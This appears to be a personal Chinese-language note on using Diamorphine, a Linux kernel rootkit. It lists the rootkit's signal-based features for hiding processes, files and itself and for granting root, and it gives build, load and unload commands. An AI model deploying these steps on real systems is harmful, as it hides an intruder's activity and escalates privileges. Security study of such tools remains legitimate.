---
{"created":"2024-12-01T19:34:40.454+08:00","tags":["rootkit","进程隐藏","权限维持"],"Type":"Note","dg-publish":true,"aliases":["海洛因","Diamorphine"],"permalink":"/26-工具使用/Diamorphine使用/","dgPassFrontmatter":true,"noteIcon":"2"}
---

项目地址 https://github.com/m0nad/Diamorphine

## 1. Features 特征
- 加载后，模块开始不可见
- 通过发送信号隐藏/取消隐藏任何进程 31
- 发送信号 63（到任何 pid）使模块变得（不可见）可见
- 发送信号 64（到任何 pid）使给定的用户成为 root
- 以 MAGIC_PREFIX 开头的文件或目录将变得不可见

发送信号
```
kill -63 <pid>
```
## 2. 安装
验证内核是否为 2.6.x/3.x/4.x/5.x

```
uname -r
```

Clone the repository 克隆存储库

```
git clone https://github.com/m0nad/Diamorphine
```

Enter the folder 进入文件夹

```
cd Diamorphine
```

Compile 编译

```
make
```

Load the module(as root) 加载模块（以 root 身份）

```
insmod diamorphine.ko
```
## 3. Uninstall 卸载
模块开始时不可见，要删除您需要使其可见

```
kill -63 0
```

然后删除模块（作为 root）

```
rmmod diamorphine
```
